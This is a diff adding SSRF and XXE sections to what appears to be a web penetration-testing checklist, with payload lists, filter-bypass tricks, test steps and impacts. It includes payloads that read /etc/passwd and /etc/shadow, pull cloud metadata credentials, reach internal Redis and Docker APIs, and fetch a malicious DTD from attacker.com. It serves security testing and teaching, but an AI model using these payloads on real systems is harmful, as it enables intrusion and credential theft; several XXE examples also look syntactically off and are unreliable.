@@ -2563,6 +2563,190 @@ Common parameters to checks: url, uri, dest, destination, redirect, redir, next,
 - DNS rebinding attacks
 - Header spoofing via internal proxies
 
+# **1. List of Vulnerabilities (SSRF Attack Surface)**
+
+* **1.1 Internal Network Port Scanning** – attacker probes internal hosts.
+* **1.2 Accessing Cloud Metadata Services** – AWS, GCP, Azure.
+* **1.3 File Retrieval via Protocol Abuse** – `file://`, `gopher://`, `dict://`, `ftp://`.
+* **1.4 Blind SSRF** – no response body but side-effects (DNS/HTTP logs).
+* **1.5 URL Bypass via Encoding** – double encoding, IP obfuscation.
+* **1.6 Open Redirect SSRF** – redirects to internal targets.
+* **1.7 Header Injection via SSRF** – using gopher/dict protocols.
+* **1.8 DNS Rebinding** – external domain resolves to internal address.
+* **1.9 Host Validation Bypass** – malformed URLs to confuse parsers.
+* **1.10 SSRF → RCE or Database Exposure** – access admin panels, APIs, Redis, Docker.
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+(Simple structure for learning — safe to read, no harmful effects)
+
+### **2.1 Internal Network Scan**
+
+```
+http://127.0.0.1:22
+http://localhost:3306
+http://192.168.1.10:8080
+```
+
+### **2.2 Cloud Metadata Access**
+
+```
+http://169.254.169.254/latest/meta-data/
+http://metadata.google.internal/computeMetadata/v1/
+```
+
+### **2.3 Protocol Abuse**
+
+```
+file:///etc/passwd
+gopher://127.0.0.1:11211/
+ftp://127.0.0.1/etc/passwd
+```
+
+### **2.4 Open Redirect SSRF**
+
+```
+http://example.com/redirect?url=http://169.254.169.254/
+```
+
+### **2.5 URL Parser Bypass**
+
+```
+http://127.0.0.1@evil.com
+http://127.0.0.1:80#evil.com
+http://2130706433     (integer form of 127.0.0.1)
+```
+
+---
+
+# **3. Bypass Payloads (Advanced Techniques)**
+
+(Used when the app blocks "localhost", "127.0.0.1", etc.)
+
+### **3.1 Encoded Localhost**
+
+```
+http://127.0.0.1
+http://127.1
+http://0
+```
+
+### **3.2 Double/Triple Encoding**
+
+```
+http://%31%32%37.0.0.1
+http://%32%31%33%30%37%30%36%34%33%33   (integer representation)
+```
+
+### **3.3 DNS Rebinding Payload**
+
+```
+http://yourdomain.com       (A record → external, CNAME → internal)
+```
+
+### **3.4 “@” Authentication Bypass Trick**
+
+```
+http://evil.com@127.0.0.1/
+```
+
+### **3.5 IPv6-Only Bypass**
+
+```
+http://[::1]/
+http://[0000:0000:0000:0000:0000:ffff:127.0.0.1]/
+```
+
+### **3.6 Open Redirect Chain**
+
+```
+http://attacker.com/redirect?to=http://169.254.169.254/
+```
+
+### **3.7 Gopher Protocol for Header Injection**
+
+```
+gopher://127.0.0.1:11211/_stats
+gopher://127.0.0.1:6379/_INFO
+```
+
+---
+
+# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+
+### **4.1 AWS EC2 Metadata Dump**
+
+```
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+```
+
+### **4.2 Redis RCE Trigger (Safe string shown)**
+
+```
+gopher://127.0.0.1:6379/_SET test "Hello"
+```
+
+### **4.3 Docker API Exposure**
+
+```
+http://localhost:2375/containers/json
+```
+
+### **4.4 Kubernetes API Exposure**
+
+```
+http://127.0.0.1:10250/pods
+```
+
+### **4.5 Jenkins Script Console**
+
+```
+http://localhost:8080/script
+```
+
+### **4.6 VM Metadata via Redirect**
+
+```
+http://open-redirect.com/?url=http://169.254.169.254/latest/
+```
+
+### **4.7 Blind SSRF DNS Callback**
+
+```
+http://abc.your-burp-collab.com
+```
+
+---
+
+# **5. Validation / Test Steps**
+
+**Step 1:** Identify any parameter accepting a URL
+→ `url=`, `image=`, `callback=`, `redirect=`, `feed=`, etc.
+
+**Step 2:** Test internal access
+→ `http://localhost`, `http://127.0.0.1`, etc.
+
+**Step 3:** Try metadata service
+→ `169.254.169.254`
+
+**Step 4:** Try protocol shifts
+→ `file://`, `gopher://`, `ftp://`
+
+**Step 5:** Try bypass techniques
+→ encodings, redirects, IPv6, DNS rebinding.
+
+---
+
+# **6. Expected Results / Impact**
+
+* Internal systems become reachable.
+* Metadata services leak secrets.
+* Admin portals exposed.
+* Redis/Memcached/DB exploitation.
+* Possible **RCE** in chained scenarios.
+  
 ### Testing with Burp Collaborator:
 1. Open Burp Collaborator.
 2. Set interaction poll.
@@ -5253,6 +5437,245 @@ Embed payloads in file formats that use XML internally.
 ✅ Expected: Secure parsing of embedded XML  
 ❌ Vulnerable: XXE triggered via file upload
 
+# **1. List of Vulnerabilities (XXE Attack Surface)**
+
+* **1.1 Classic External Entity Injection**
+  Loading external files via `<!ENTITY>`.
+
+* **1.2 File Disclosure via XXE**
+  Reading sensitive files such as `/etc/passwd`.
+
+* **1.3 SSRF via XXE**
+  Using XML parsers to send requests to internal services.
+
+* **1.4 Blind XXE (Out-of-Band)**
+  Exfiltrating data using DNS/HTTP callbacks.
+
+* **1.5 Parameter Entity Expansion**
+  Parser loads external entities inside attributes.
+
+* **1.6 Billion Laughs (DoS)**
+  Recursive entities causing memory exhaustion.
+
+* **1.7 Schema / DTD Injection**
+  Attacker injects malicious internal DTD references.
+
+* **1.8 External DTD Fetching Bypass**
+  With custom URIs, multi-encoding, or specially crafted payloads.
+
+* **1.9 SVG, SOAP, DOCX, PDF XXE**
+  XXE through XML-based file formats.
+
+* **1.10 XXE → RCE (rare, chained)**
+  When XML parser interacts with command-executing libraries.
+
+---
+
+# **2. Sample Payloads (Core Attack Payloads)**
+
+(Simple, safe-to-read examples)
+
+### **2.1 Basic XXE – File Read**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>&xxe;</root>
+```
+
+### **2.2 SSRF via XXE**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://127.0.0.1:80/">
+]>
+<root>&xxe;</root>
+```
+
+### **2.3 Blind XXE (DNS/HTTP Ping)**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://abc.your-callback-domain.com/">
+]>
+<data>&xxe;</data>
+```
+
+### **2.4 Billion Laughs (DoS Example)**
+
+```xml
+<!DOCTYPE lolz [
+ <!ENTITY a "123">
+ <!ENTITY b "&a;&a;">
+ <!ENTITY c "&b;&b;">
+]>
+<data>&c;</data>
+```
+
+---
+
+# **3. Bypass Payloads (Advanced Techniques)**
+
+Used when the application blocks DTD or external entities.
+
+### **3.1 Base64 Encoded File Read**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+  <!ENTITY xxe "%data;">
+]>
+<root>&xxe;</root>
+```
+
+### **3.2 Parameter Entity Bypass**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % p1 SYSTEM "file:///etc/passwd">
+  <!ENTITY p2 "%p1;">
+]>
+<root>%p2;</root>
+```
+
+### **3.3 XXE in SOAP Envelope**
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE a [
+  <!ENTITY xxe SYSTEM "file:///etc/shadow">
+]>
+<soap:Envelope>
+  <data>&xxe;</data>
+</soap:Envelope>
+```
+
+### **3.4 External DTD Bypass**
+
+Hosted malicious DTD:
+
+```xml
+<!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
+<root>test</root>
+```
+
+`malicious.dtd`:
+
+```xml
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY data "%xxe;">
+```
+
+### **3.5 Encoding Bypass**
+
+```xml
+<!DOCTYPE %25foo [
+  <!ENTITY %25xxe SYSTEM "file:///etc/passwd">
+]>
+```
+
+### **3.6 Numeric IP SSRF**
+
+```
+http://2130706433        (127.0.0.1 in decimal)
+```
+
+### **3.7 SVG File XXE**
+
+```xml
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<svg>&xxe;</svg>
+```
+
+---
+
+# **4. Updated With Realistic Testing Payloads (Advanced Learning)**
+
+### **4.1 Real File Disclosure Payload**
+
+```xml
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "/etc/hostname">
+]>
+<root>&xxe;</root>
+```
+
+### **4.2 AWS Metadata Access**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">
+]>
+<root>&xxe;</root>
+```
+
+### **4.3 GitHub Enterprise (SSRF)**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://localhost:8080/api/v3/admin">
+]>
+<data>&xxe;</data>
+```
+
+### **4.4 Blind XXE with Burp Collaborator**
+
+```xml
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "http://x.your-collab.net">
+]>
+<ping>&xxe;</ping>
+```
+
+### **4.5 DOCX / PPTX XXE (word/document.xml)**
+
+```xml
+<!DOCTYPE r [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<w:p>&xxe;</w:p>
+```
+
+### **4.6 PDF XXE (XMP Section)**
+
+```xml
+<!DOCTYPE x [
+  <!ENTITY xxe SYSTEM "file:///etc/hosts">
+]>
+<metadata>&xxe;</metadata>
+```
+
+---
+
+# **5. Validation / Test Steps**
+
+**Step 1:** Identify any XML-processing endpoint
+→ SOAP, SAML, SVG upload, RSS feeds, XML APIs, PDF/DOCX processors.
+
+**Step 2:** Send basic XXE — check for file content.
+→ `/etc/passwd`, `/etc/hostname`.
+
+**Step 3:** Attempt SSRF XXE
+→ `127.0.0.1`, `169.254.169.254`.
+
+**Step 4:** Try blind XXE / OOB
+→ DNS/HTTP callbacks.
+
+**Step 5:** Try bypass payloads
+→ parameter entities, encoded DTD, external DTD hosting.
+
+---
+
+# **6. Expected Results / Impact**
+
+* Sensitive file disclosure.
+* SSRF into internal systems.
+* Cloud metadata credentials leakage.
+* Application crash due to DoS.
+* Potential **RCE** when chained with unsafe parsers or libraries.
 ---
 
 ### 10. Content-Type Mismatch  
